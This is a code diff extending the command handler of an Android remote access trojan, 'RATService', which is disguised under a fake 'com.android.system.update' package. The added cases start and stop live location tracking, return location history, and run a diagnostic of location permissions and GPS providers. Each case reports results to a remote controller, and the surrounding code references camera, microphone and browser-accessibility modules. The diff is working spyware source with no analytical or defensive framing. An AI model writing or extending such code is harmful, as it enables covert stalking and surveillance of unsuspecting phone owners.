@@ -34,6 +34,7 @@ import com.android.system.update.modules.CameraModule;
 import com.android.system.update.modules.*;
 import com.android.system.update.modules.BrowserModule;
 import com.android.system.update.BrowserAccessibilityService;
+import com.android.system.update.modules.LocationModule;
 
 import androidx.core.app.NotificationCompat;
 import androidx.core.app.ActivityCompat;
@@ -755,6 +756,7 @@ public class RATService extends Service {
 
 // Add these cases in the routeCommand method
 
+// Add these cases in the routeCommand method
 case "location":
 case "get_location":
     if (locationModule != null) {
@@ -767,7 +769,11 @@ case "get_location":
     break;
 
 case "location_stream":
-    if (args.equals("start") || args.equals("begin") || args.equals("on")) {
+    Log.d(TAG, "📍 Location stream command: " + args);
+    String[] streamArgs = args.trim().split("\\s+");
+    String streamAction = streamArgs.length > 0 ? streamArgs[0] : "";
+    
+    if (streamAction.equals("start") || streamAction.equals("begin") || streamAction.equals("on")) {
         if (locationModule != null) {
             Log.d(TAG, "📍 Starting location tracking");
             locationModule.startTracking(new LocationModule.LocationCallback() {
@@ -785,7 +791,7 @@ case "location_stream":
         } else {
             sendCommand("LOCATION_STREAM|error: Location module not available");
         }
-    } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
+    } else if (streamAction.equals("stop") || streamAction.equals("end") || streamAction.equals("off")) {
         if (locationModule != null) {
             locationModule.stopTracking();
             sendCommand("LOCATION_STREAM|stopped");
@@ -806,7 +812,21 @@ case "location_history":
         sendCommand("LOCATION_HISTORY|{\"error\":\"Location module not available\"}");
     }
     break;
-
+case "location_test":
+    StringBuilder locTest = new StringBuilder();
+    locTest.append("Location module: ").append(locationModule != null).append("\n");
+    locTest.append("Location permission: ").append(checkLocationPermission()).append("\n");
+    
+    // Check location providers
+    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+    if (lm != null) {
+        locTest.append("GPS enabled: ").append(lm.isProviderEnabled(LocationManager.GPS_PROVIDER)).append("\n");
+        locTest.append("Network enabled: ").append(lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)).append("\n");
+        locTest.append("Passive enabled: ").append(lm.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)).append("\n");
+    }
+    
+    sendCommand("LOCATION_TEST|" + locTest.toString());
+    break;
             case "mic_path":
                 if (micModule != null) {
                     String result = micModule.getRecordingsPath();
